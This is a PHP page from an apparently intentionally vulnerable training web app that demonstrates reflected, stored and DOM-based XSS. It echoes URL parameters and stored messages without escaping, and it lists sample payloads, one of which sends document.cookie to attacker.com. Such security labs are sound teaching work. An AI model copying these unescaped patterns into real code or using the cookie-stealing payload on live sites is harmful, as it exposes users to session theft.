<?php
require_once 'config.php';

// Intentionally vulnerable XSS demonstration
$messages = [];
$user_input = '';
$stored_messages = [];

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user_input = $_POST['message'] ?? '';
    $user_name = $_POST['name'] ?? 'Anonymous';
    
    // Intentionally vulnerable - store user input without sanitization
    if (!empty($user_input)) {
        $stored_messages[] = [
            'name' => $user_name,
            'message' => $user_input,
            'time' => date('Y-m-d H:i:s')
        ];
        
        // Intentionally vulnerable - store in file without sanitization
        $message_file = "xss_messages.txt";
        $message_data = json_encode([
            'name' => $user_name,
            'message' => $user_input,
            'time' => date('Y-m-d H:i:s')
        ]) . "\n";
        
        file_put_contents($message_file, $message_data, FILE_APPEND);
    }
}

// Load stored messages
if (file_exists("xss_messages.txt")) {
    $lines = file("xss_messages.txt", FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $stored_messages[] = json_decode($line, true);
    }
}

// Intentionally vulnerable - URL parameter reflection
$url_param = $_GET['param'] ?? '';
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Demonstration - Diaco</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
    <style>
        .message-box {
            border: 1px solid #ddd;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 5px;
        }
        .message-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 10px;
        }
        .message-content {
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <?php include 'navbar.php'; ?>

    <div class="container my-5">
        <h1 class="mb-4">XSS Vulnerability Demonstration</h1>
        
        <div class="alert alert-warning">
            <strong>Warning:</strong> This page contains intentional XSS vulnerabilities for educational purposes.
            Do not use these techniques on real websites without permission.
        </div>
        
        <!-- Intentionally vulnerable - URL parameter reflection -->
        <?php if (!empty($url_param)): ?>
            <div class="alert alert-info">
                <strong>URL Parameter:</strong> <?php echo $url_param; ?>
            </div>
        <?php endif; ?>
        
        <!-- Intentionally vulnerable message form -->
        <div class="card mb-4">
            <div class="card-header">
                <h3>Post a Message</h3>
            </div>
            <div class="card-body">
                <form method="POST" action="xss_demo.php">
                    <div class="mb-3">
                        <label for="name" class="form-label">Your Name</label>
                        <input type="text" class="form-control" id="name" name="name" 
                               placeholder="Anonymous" value="<?php echo $user_input; ?>">
                    </div>
                    <div class="mb-3">
                        <label for="message" class="form-label">Your Message</label>
                        <textarea class="form-control" id="message" name="message" rows="3" required></textarea>
                    </div>
                    <button type="submit" class="btn btn-primary">Post Message</button>
                </form>
            </div>
        </div>
        
        <!-- Intentionally vulnerable - display stored messages -->
        <h2>Stored Messages</h2>
        <?php if (!empty($stored_messages)): ?>
            <?php foreach (array_reverse($stored_messages) as $msg): ?>
                <div class="message-box">
                    <div class="message-header">
                        <strong><?php echo $msg['name']; ?></strong>
                        <span class="text-muted"><?php echo $msg['time']; ?></span>
                    </div>
                    <div class="message-content">
                        <?php echo $msg['message']; ?>
                    </div>
                </div>
            <?php endforeach; ?>
        <?php else: ?>
            <div class="alert alert-info">No messages yet. Be the first to post!</div>
        <?php endif; ?>
        
        <!-- XSS Examples -->
        <div class="card mt-4">
            <div class="card-header">
                <h3>XSS Examples</h3>
            </div>
            <div class="card-body">
                <h4>Reflected XSS</h4>
                <p>Try these URLs:</p>
                <ul>
                    <li><code>?param=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                    <li><code>?param=&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                    <li><code>?param=&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;</code></li>
                </ul>
                
                <h4>Stored XSS</h4>
                <p>Try posting these messages:</p>
                <ul>
                    <li><code>&lt;script&gt;alert('Stored XSS')&lt;/script&gt;</code></li>
                    <li><code>&lt;img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)"&gt;</code></li>
                    <li><code>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</code></li>
                </ul>
                
                <h4>DOM-based XSS</h4>
                <p>Try this in the browser console:</p>
                <pre><code>document.querySelector('.message-content').innerHTML = '&lt;img src=x onerror=alert("DOM XSS")&gt;';</code></pre>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html> 